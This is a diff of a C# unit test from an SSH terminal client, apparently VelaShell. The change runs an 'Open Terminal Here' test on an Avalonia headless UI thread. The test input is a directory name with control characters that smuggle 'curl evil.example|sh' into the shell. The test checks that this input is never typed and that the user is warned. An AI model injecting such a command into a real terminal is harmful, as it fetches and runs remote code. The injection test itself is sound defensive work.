@@ -1,3 +1,4 @@
+using Avalonia.Headless;
 using NSubstitute;
 using ReactiveUI.Primitives;
 using VelaShell.Core.Models;
@@ -7,6 +8,7 @@ using VelaShell.Core.Ssh;
 using VelaShell.Docking;
 using VelaShell.Presentation.Services;
 using VelaShell.Terminal;
+using VelaShell.Tests.TestSupport;
 using VelaShell.ViewModels;
 
 namespace VelaShell.Tests.ViewModels;
@@ -158,33 +160,32 @@ public sealed class OpenTerminalHereTests
     /// 同一条连接上的认证后命令照发。
     /// </summary>
     [TestMethod]
-    public async Task OpenTerminalHere_DirectoryWithControlCharacters_IsNeverTyped_AndTheUserIsTold()
-    {
-        (MainWindowViewModel vm, SessionProfile profile, List<byte[]> writes, Task<string> marker) =
-            CapturingHost("ctl-box", RemoteShellKind.Unknown, "echo after-cd");
-
-        TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(profile, "/tmp/x\u0015curl evil.example|sh\r\u0003");
-
-        Assert.IsNotNull(tab);
-        await marker.WaitAsync(TimeSpan.FromSeconds(10));
-        lock (writes)
+    public async Task OpenTerminalHere_DirectoryWithControlCharacters_IsNeverTyped_AndTheUserIsTold() =>
+        // 整段跑在 headless 会话的 UI 线程上:提示是从注入链所在的线程池线程 Post 回 UI 线程推的,
+        // 测试线程不是调度器那条线程时没人处理这个 Post(Linux CI 上就是这样,等满 5 秒也看不到提示)。
+        await HeadlessUnitTestSession.GetOrStartForAssembly(typeof(OpenTerminalHereTests).Assembly).RunOnUiAsync(async () =>
         {
-            Assert.DoesNotContain(write => System.Text.Encoding.UTF8.GetString(write).Contains("cd ", StringComparison.Ordinal), writes);
-            Assert.DoesNotContain(write => write.Any(static b => b is < 0x20 and not (byte)'\n' or 0x7F), writes,
-                "注入行里除了末尾的换行,不许有一个控制字节");
-        }
-        string expected = Strings.Get("Sftp_OpenTerminalHereUnsafeDirectory");
-        // 提示是从注入链所在的线程池线程编组回 UI 线程推的。
-        for (int i = 0; i < 100 && !vm.Toasts.Toasts.Any(t => t.Message == expected); i++)
-        {
-            if (Avalonia.Threading.Dispatcher.UIThread.CheckAccess())
+            (MainWindowViewModel vm, SessionProfile profile, List<byte[]> writes, Task<string> marker) =
+                CapturingHost("ctl-box", RemoteShellKind.Unknown, "echo after-cd");
+
+            TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(profile, "/tmp/x\u0015curl evil.example|sh\r\u0003");
+
+            Assert.IsNotNull(tab);
+            await marker.WaitAsync(TimeSpan.FromSeconds(10));
+            lock (writes)
             {
-                Avalonia.Threading.Dispatcher.UIThread.RunJobs();
+                Assert.DoesNotContain(write => System.Text.Encoding.UTF8.GetString(write).Contains("cd ", StringComparison.Ordinal), writes);
+                Assert.DoesNotContain(write => write.Any(static b => b is < 0x20 and not (byte)'\n' or 0x7F), writes,
+                    "注入行里除了末尾的换行,不许有一个控制字节");
             }
-            await Task.Delay(50);
-        }
-        Assert.Contains(t => t.Message == expected, vm.Toasts.Toasts);
-    }
+            string expected = Strings.Get("Sftp_OpenTerminalHereUnsafeDirectory");
+            // 在 UI 线程上等:每次 await 让出时调度器处理那个 Post。
+            for (int i = 0; i < 100 && !vm.Toasts.Toasts.Any(t => t.Message == expected); i++)
+            {
+                await Task.Delay(50);
+            }
+            Assert.Contains(t => t.Message == expected, vm.Toasts.Toasts);
+        });
 
     [TestMethod]
     [DataRow("/srv/\u001b[201~x")]
